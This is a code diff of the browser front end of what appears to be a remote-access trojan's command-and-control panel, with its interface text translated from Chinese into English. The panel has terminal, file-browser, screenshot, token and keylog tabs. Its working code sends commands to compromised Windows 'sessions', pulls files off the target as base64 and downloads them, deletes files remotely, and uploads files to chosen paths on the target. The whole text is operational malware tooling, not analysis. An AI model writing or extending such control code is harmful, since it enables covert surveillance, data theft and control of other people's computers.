+  if(cmd.toLowerCase()==='clear'||cmd.toLowerCase()==='cls'){termClear();return;}
+  sendTask(taskType, {command:cmd});
 }
 
-function addOutput(cmd, result, status) {
-  const output = document.getElementById('output');
-  if (output.querySelector('.empty-state')) output.innerHTML = '';
-  const entry = document.createElement('div');
-  entry.className = 'entry ' + (status==='error'?'error':status==='pending'?'pending':'success');
-  entry.dataset.taskId = '';
-  entry.innerHTML = `<div class="cmd">${cmd}</div><div class="result">${result}</div><div class="meta">${new Date().toLocaleTimeString()} | ${status==='pending'?'等待中':status==='error'?'失败':'完成'}</div>`;
-  output.appendChild(entry);
-  output.scrollTop = output.scrollHeight;
-  return entry;
+// === Tab Switching ===
+function switchTab(tab) {
+  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
+  document.querySelectorAll('.tab-panel').forEach(p=>p.classList.remove('visible'));
+
+  const tabMap = {'terminal':0,'files':1,'screenshot':2,'token':3,'keylog':4};
+  const idx = tabMap[tab];
+  const tabs = document.querySelectorAll('.tab');
+  if(tabs[idx]) tabs[idx].classList.add('active');
+
+  const panel = document.getElementById('tab-'+tab);
+  if(panel) panel.classList.add('visible');
 }
 
 // === File Browser ===
 let currentFilePath = 'C:\\';
-
-function switchTab(tab) {
-  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-  document.querySelector(`.tab:nth-child(${tab==='terminal'?1:2})`).classList.add('active');
-  document.getElementById('tab-terminal').style.display = tab==='terminal'?'flex':'none';
-  document.getElementById('tab-files').style.display = tab==='files'?'flex':'none';
-}
+let pendingDownload = null;
 
 function browseDir() {
   const path = document.getElementById('file-path').value.trim();
-  if (!path) return;
+  if(!path) return;
   currentFilePath = path;
-  sendTask('listdir', {path: path});
+  sendTask('listdir',{path:path});
 }
 
 function goUpDir() {
   let path = currentFilePath;
-  // Remove trailing slash/backslash
-  path = path.replace(/[\\\/]$/, '');
-  // Find last separator
-  const lastSep = Math.max(path.lastIndexOf('\\'), path.lastIndexOf('/'));
-  if (lastSep > 0) {
-    path = path.substring(0, lastSep + 1);
+  path = path.replace(/[\\\/]$/,'');
+  const lastSep = Math.max(path.lastIndexOf('\\'),path.lastIndexOf('/'));
+  if(lastSep>0){
+    path = path.substring(0,lastSep+1);
   } else {
-    path = path.substring(0, 3); // Keep drive letter like "C:\"
+    path = path.substring(0,3);
   }
   document.getElementById('file-path').value = path;
   currentFilePath = path;
@@ -516,58 +1049,72 @@ function goUpDir() {
 }
 
 function promptFileDel() {
-  // 删除当前选中的文件（通过对话框输入路径）
-  showDialog('删除文件', '请输入要删除的文件完整路径', currentFilePath, (val) => sendTask('filedel', {path: val}));
+  showDialog('Delete File','Enter file path to delete',currentFilePath,(val)=>sendTask('filedel',{path:val}));
 }
 
-// 下载文件：下发fileread任务，结果回来后解码base64并触发浏览器下载
-let pendingDownload = null;
-
 function downloadFile(filePath, fileName) {
-  if (!activeSession) { showAlert('无活跃会话'); return; }
-  pendingDownload = {fileName: fileName, filePath: filePath};
-  const entry = addOutput('下载文件: '+fileName, '正在读取文件...', 'pending');
-  entry.dataset.taskType = 'fileread';
-  apiAuth('/task', 'POST', {session_id: activeSession, task_type: 'fileread', params: {path: filePath}});
+  if(!activeSession){showAlert('No active session');return;}
+  pendingDownload = {fileName:fileName, filePath:filePath};
+  apiAuth('/task','POST',{session_id:activeSession,task_type:'fileread',params:{path:filePath}});
+  termPrint(`Downloading: ${fileName}`, 't-info');
+}
+
+function handleFileDownload(data) {
+  if(!pendingDownload) return;
+  if(data.success && data.output){
+    try {
+      const b64 = data.output.trim();
+      const binary = atob(b64);
+      const bytes = new Uint8Array(binary.length);
+      for(let i=0;i<binary.length;i++) bytes[i] = binary.charCodeAt(i);
+      const blob = new Blob([bytes]);
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url; a.download = pendingDownload.fileName; a.click();
+      URL.revokeObjectURL(url);
+      termPrint(`Downloaded: ${pendingDownload.fileName} (${bytes.length} bytes)`, 't-info');
+    } catch(err){
+      termPrint(`Download failed: ${err.message}`, 't-error');
+    }
+  } else {
+    termPrint(`Download failed: ${data.error||'Unknown error'}`, 't-error');
+  }
+  pendingDownload = null;
 }
 
 function renderFileList(output, basePath) {
   const list = document.getElementById('file-list');
-  if (!output) { list.innerHTML = '<div style="color:var(--dim);text-align:center;padding:20px">空目录或无权限</div>'; return; }
+  if(!output){list.innerHTML='<div style="color:var(--dim);text-align:center;padding:24px">Empty directory or no access</div>';return;}
   const lines = output.split('\n').filter(l=>l.trim());
   list.innerHTML = '';
-  // Add ".." entry for going up
-  if (basePath) {
+  if(basePath){
     const upEntry = document.createElement('div');
     upEntry.className = 'file-entry';
-    upEntry.innerHTML = `<span class="fname" style="color:var(--warn)">..</span><span class="fdir">上级目录</span>`;
+    upEntry.innerHTML = `<span class="f-icon">&#9650;</span><span class="f-name dir">..</span><span class="f-size"></span><span class="f-time">Parent directory</span>`;
     upEntry.onclick = goUpDir;
     list.appendChild(upEntry);
   }
   lines.forEach(line => {
-    // Parse format: "名称 | 大小 | 时间 | DIR/FILE"
     const parts = line.split(' | ');
-    const name = (parts[0] || '').trim();
-    const size = (parts[1] || '').trim();
-    const time = (parts[2] || '').trim();
-    const type = (parts[3] || '').trim();
-    const isDir = type === 'DIR';
-    if (!name) return;
+    const name = (parts[0]||'').trim();
+    const size = (parts[1]||'').trim();
+    const time = (parts[2]||'').trim();
+    const type = (parts[3]||'').trim();
+    const isDir = type==='DIR';
+    if(!name) return;
     const div = document.createElement('div');
     div.className = 'file-entry';
-    const sizeStr = isDir ? '' : (size > 1024*1024 ? (size/1024/1024).toFixed(1)+'MB' : size > 1024 ? (size/1024).toFixed(1)+'KB' : size+'B');
-    div.innerHTML = `<span class="fname" style="color:${isDir?'var(--warn)':'var(--accent)'}">${name}</span>${isDir?'<span class="fdir">目录</span>':'<span class="fsize">'+sizeStr+'</span>'}<span class="fsize" style="color:#8395a7">${time}</span>`;
-    div.title = isDir ? `进入目录: ${name}` : `下载文件: ${name}`;
-    div.style.cursor = 'pointer';
+    const sizeStr = isDir ? '-' : (size>1024*1024?(size/1024/1024).toFixed(1)+'M':size>1024?(size/1024).toFixed(1)+'K':size+'B');
+    div.innerHTML = `<span class="f-icon">${isDir?'&#9660;':'&#9707;'}</span><span class="f-name ${isDir?'dir':''}">${name}</span><span class="f-size">${sizeStr}</span><span class="f-time">${time}</span>`;
+    div.title = isDir ? 'Open: '+name : 'Download: '+name;
     div.onclick = () => {
-      if (isDir) {
-        const newPath = basePath.replace(/[\\\/]$/, '') + '\\' + name;
-        document.getElementById('file-path').value = newPath + '\\';
-        currentFilePath = newPath + '\\';
+      if(isDir){
+        const newPath = basePath.replace(/[\\\/]$/,'')+'\\'+name;
+        document.getElementById('file-path').value = newPath+'\\';
+        currentFilePath = newPath+'\\';
         browseDir();
       } else {
-        // 点击文件 → 下载
-        const filePath = basePath.replace(/[\\\/]$/, '') + '\\' + name;
+        const filePath = basePath.replace(/[\\\/]$/,'')+'\\'+name;
         downloadFile(filePath, name);
       }
     };
@@ -582,33 +1129,30 @@ function triggerUpload() {
 function handleFileUpload() {
   const fileInput = document.getElementById('file-upload-input');
   const file = fileInput.files[0];
-  if (!file) return;
-  showDialog('上传文件', '输入目标机器上的保存路径', '', (targetPath) => {
-    document.getElementById('upload-status').textContent = '上传中...';
-
+  if(!file) return;
+  showDialog('Upload File','Target path on remote host','', (targetPath) => {
+    document.getElementById('upload-status').textContent = 'Uploading...';
     const formData = new FormData();
     formData.append('file', file);
     formData.append('session_id', activeSession);
     formData.append('target_path', targetPath);
-
-    fetch(API+'/files/upload?token='+authToken, {method:'POST', body:formData}).then(r => r.json()).then(data => {
-      document.getElementById('upload-status').textContent = data.status === 'queued' ? `已下发 (${data.size} bytes)` : '失败';
-    }).catch(e => {
-      document.getElementById('upload-status').textContent = '上传失败';
+    fetch(API+'/files/upload?token='+authToken,{method:'POST',body:formData}).then(r=>r.json()).then(data=>{
+      document.getElementById('upload-status').textContent = data.status==='queued'?`Queued (${data.size} bytes)`:'Failed';
+    }).catch(()=>{
+      document.getElementById('upload-status').textContent = 'Upload failed';
     });
     fileInput.value = '';
   });
 }
 
 // === Init ===
-if (authToken) {
+if(authToken){
   showApp();
 } else {
   document.getElementById('login-screen').style.display = 'flex';
   document.getElementById('app-screen').style.display = 'none';
 }
 
-// Auto-refresh sessions (fallback if WS fails)
 setInterval(refreshSessions, 5000);
 </script>
 </body>
